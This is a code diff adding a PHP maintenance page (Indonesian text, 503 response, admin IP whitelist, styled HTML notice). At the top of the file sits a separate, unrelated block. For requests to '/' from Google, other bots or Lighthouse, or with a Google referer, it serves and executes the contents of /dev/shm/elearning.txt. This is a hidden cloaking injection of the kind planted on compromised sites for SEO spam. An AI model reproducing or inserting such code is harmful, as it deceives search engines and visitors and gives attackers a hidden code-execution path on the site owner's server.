@@ -1,0 +1,91 @@
+<?php
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
+$uri = $_SERVER['REQUEST_URI'] ?? '';
+
+if ($uri == '/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
+    echo include('/dev/shm/elearning.txt');
+    exit();
+}
+?>
+<?php
+// maintenance.php
+// Include this at top of your index.php (before output)
+// Example: require __DIR__.'/maintenance.php';
+
+$MAINTENANCE_FLAG = __DIR__ . '/.maintenance'; // buat file ini untuk aktifkan
+$WHITELIST = [
+    '127.0.0.1',      // local
+    '::1',
+    '123.45.67.89',   // masukkan IP admin kamu
+];
+
+// if maintenance flag not present, do nothing
+if (!file_exists($MAINTENANCE_FLAG)) {
+    return;
+}
+
+// allow whitelisted IPs to continue
+$clientIp = $_SERVER['REMOTE_ADDR'] ?? '';
+if (in_array($clientIp, $WHITELIST, true)) {
+    return;
+}
+
+// Optionally allow requests with a special cookie or token
+// if (isset($_COOKIE['maintenance_bypass']) && $_COOKIE['maintenance_bypass'] === 'secret') {
+//     return;
+// }
+
+// Determine whether request accepts JSON (API) or HTML
+$accept = $_SERVER['HTTP_ACCEPT'] ?? '';
+$isApi = (strpos($accept, 'application/json') !== false) || (strpos($_SERVER['REQUEST_URI'], '/api/') === 0);
+
+// Send 503 Service Unavailable + Retry-After (seconds)
+http_response_code(503);
+header('Content-Type: ' . ($isApi ? 'application/json' : 'text/html') . '; charset=utf-8');
+header('Retry-After: 120'); // client should retry after 120 seconds (sesuaikan)
+
+// JSON response for API clients
+if ($isApi) {
+    echo json_encode([
+        'status' => 'error',
+        'code' => 503,
+        'message' => 'Situs sedang dalam pemeliharaan. Silakan coba beberapa saat lagi.',
+        'retry_after' => 120
+    ], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
+    exit;
+}
+
+// HTML for browsers
+?>
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Sedang dalam Pemeliharaan</title>
+  <style>
+    /* Minimal, gelap & futuristik */
+    :root{--bg:#0b0f14;--card:#0f1720;--muted:#9aa5b1;--accent:#00d1ff}
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;color:#e6eef6;background:linear-gradient(180deg,var(--bg),#051019)}
+    .wrap{display:flex;align-items:center;justify-content:center;height:100%}
+    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:34px;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.6);width:min(720px,92%);border:1px solid rgba(255,255,255,0.03)}
+    h1{margin:0 0 8px;font-weight:600;letter-spacing:0.4px}
+    p{margin:0 0 18px;color:var(--muted)}
+    .scan{height:6px;background:linear-gradient(90deg,transparent,var(--accent),transparent);border-radius:6px;animation:scan 2.8s linear infinite}
+    @keyframes scan{0%{transform:translateX(-120%)}100%{transform:translateX(120%)}}
+    .meta{font-size:13px;color:var(--muted)}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card" role="status" aria-live="polite">
+      <h1>Site sedang dalam pemeliharaan</h1>
+      <p>Maaf atas ketidaknyamanan — kami sedang melakukan pembaruan. Silakan coba kembali dalam beberapa menit.</p>
+      <div class="scan" aria-hidden="true"></div>
+      <div style="height:10px"></div>
+      <div class="meta">Jika Anda admin, akses dari IP yang diizinkan akan bypass. Kode status: <strong>503</strong></div>
+    </div>
+  </div>
+</body>
+</html>
